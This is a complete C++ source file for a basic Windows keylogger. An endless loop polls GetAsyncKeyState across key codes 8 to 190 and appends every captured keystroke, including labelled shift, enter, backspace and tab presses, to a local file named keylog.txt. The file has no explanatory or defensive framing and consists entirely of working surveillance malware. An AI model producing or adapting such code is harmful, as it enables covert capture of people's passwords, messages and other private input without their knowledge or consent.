#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

// Function to log the keystrokes to a file
void logKey(int key) {
    ofstream logfile;
    logfile.open("keylog.txt", ios::app);

    if (logfile.is_open()) {
        // Handling special keys like space, enter, and shift
        switch (key) {
        case VK_SPACE:
            logfile << " ";
            break;
        case VK_RETURN:
            logfile << "\n";
            break;
        case VK_SHIFT:
            logfile << "[SHIFT]";
            break;
        case VK_BACK:
            logfile << "[BACKSPACE]";
            break;
        case VK_TAB:
            logfile << "[TAB]";
            break;
        default:
            logfile << char(key);  // Log the actual key character
        }
    }
    logfile.close();
}

// Main function to continuously log the keys
int main() {
    while (true) {
        // Iterate through all possible key codes
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(key);
            }
        }
        Sleep(10);  // Small delay to prevent high CPU usage
    }
    return 0;
}
